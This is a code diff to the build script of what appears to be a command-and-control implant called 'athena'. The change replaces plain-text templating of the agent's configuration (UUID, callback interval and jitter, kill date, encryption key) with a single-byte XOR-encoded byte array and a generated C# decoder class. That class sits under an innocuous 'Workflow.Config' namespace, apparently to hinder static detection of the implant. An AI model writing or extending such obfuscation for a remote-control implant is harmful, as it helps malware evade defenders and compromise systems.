@@ -9,6 +9,7 @@ from .athena_utils import mac_bundler
 import asyncio
 import json
 import os
+import random
 import sys
 import shutil
 import tempfile
@@ -234,21 +235,65 @@ class athena(PayloadType):
         )
 
     def buildConfig(self, agent_build_path, c2):
-        #I could modify this to be more efficient, but it doesn't take that long so screw it. Maybe later.
-        baseConfigFile = open("{}/ServiceHost/Config/ServiceConfig.cs".format(agent_build_path.name), "r").read()
-        baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
+        config = {
+            "uuid": self.uuid,
+            "callback_interval": 60,
+            "callback_jitter": 10,
+            "killdate": "",
+            "psk": "",
+        }
+
         for key, val in c2.get_parameters_dict().items():
             if key == "AESPSK":
-                baseConfigFile = baseConfigFile.replace("%PSK%", val["enc_key"] if val["enc_key"] is not None else "")
+                config["psk"] = val["enc_key"] if val["enc_key"] is not None else ""
                 if val["enc_key"] is not None:
                     self.addCrypto(agent_build_path, "Aes")
                 else:
                     self.addCrypto(agent_build_path, "None")
-            else:
-                baseConfigFile = baseConfigFile.replace(str(key), str(val))
-                    
-        with open("{}/ServiceHost/Config/ServiceConfig.cs".format(agent_build_path.name), "w") as f:
-            f.write(baseConfigFile)
+            elif key in ("callback_interval", "callback_jitter"):
+                config[key] = int(val)
+            elif key == "killdate":
+                config[key] = str(val)
+
+        json_bytes = json.dumps(config).encode("utf-8")
+
+        xor_key = random.randint(1, 255)
+        encoded = bytes(b ^ xor_key for b in json_bytes)
+
+        byte_literal = ", ".join(
+            "0x{:02X}".format(b) for b in encoded
+        )
+
+        cs_source = (
+            "#if !CHECKYMANDERDEV\n"
+            "namespace Workflow.Config\n"
+            "{{\n"
+            "    internal static class ServiceConfigData\n"
+            "    {{\n"
+            "        private static readonly byte[] _d = "
+            "new byte[] {{ {} }};\n"
+            "        private static readonly byte _k = "
+            "0x{:02X};\n"
+            "\n"
+            "        internal static string Decode()\n"
+            "        {{\n"
+            "            byte[] r = new byte[_d.Length];\n"
+            "            for (int i = 0; i < _d.Length; i++)\n"
+            "                r[i] = (byte)(_d[i] ^ _k);\n"
+            "            return System.Text.Encoding"
+            ".UTF8.GetString(r);\n"
+            "        }}\n"
+            "    }}\n"
+            "}}\n"
+            "#endif\n"
+        ).format(byte_literal, xor_key)
+
+        config_path = os.path.join(
+            agent_build_path.name,
+            "ServiceHost", "Config", "ServiceConfigData.g.cs"
+        )
+        with open(config_path, "w") as f:
+            f.write(cs_source)
 
     # These could be combined but that's a later problem.
     def addCommand(self, agent_build_path, command_name):
